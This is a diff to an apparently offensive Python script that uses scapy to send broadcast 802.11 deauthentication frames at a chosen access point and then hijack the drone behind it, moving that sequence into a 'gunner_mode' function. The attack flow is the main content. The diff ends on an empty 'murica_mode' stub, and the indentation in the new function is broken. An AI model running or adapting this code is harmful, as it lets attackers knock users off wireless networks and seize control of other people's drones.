@@ -14,13 +14,13 @@ class Deauth(threading.Thread):
         self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()
 
     def run(self):
-        for item in range(0,20):
+        for item in range(0,10):
             scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2, verbose=0)
         print "Attack complete"
 
 auto_target = 'Drone'
 armed = 0
-pkt_count = 40
+pkt_count = 20
 pkt_all = 0
 ap_list = []
 interfaces = []
@@ -97,25 +97,27 @@ def seek_target():
       print()
       i = input("Enter target: ")
       return int(i)
+      
 
 
 
-
-
-print('Starting target scanning')
-monitor_manage('start')
-interfaces = get_interface()
-wl = '' 
-for item in interfaces:
+def gunner_mode():
+   print('Starting target scanning...Ctrl+C to end early')
+   monitor_manage('start')
+   interfaces = get_interface()
+   wl = '' 
+   for item in interfaces:
    if 'wlan' in item:
       wl = item
       break
+   targ_id = seek_target()
+   Deauth(ap_list[targ_id - 1][0]).start()
+   a = raw_input("Deauthing...hit enter when deauth tips you off")
+   monitor_manage('stop')
+   hijack_drone(ap_list[targ_id - 1][1],wl)
+   swarm.demon_drone() 
 
-targ_id = seek_target()
-Deauth(ap_list[targ_id - 1][0]).start()
-a = raw_input("Deauthing...hit enter when deauth tips you off")
-monitor_manage('stop')
-hijack_drone(ap_list[targ_id - 1][1],wl)
-swarm.demon_drone() 
+def murica_mode():
+   
 
 
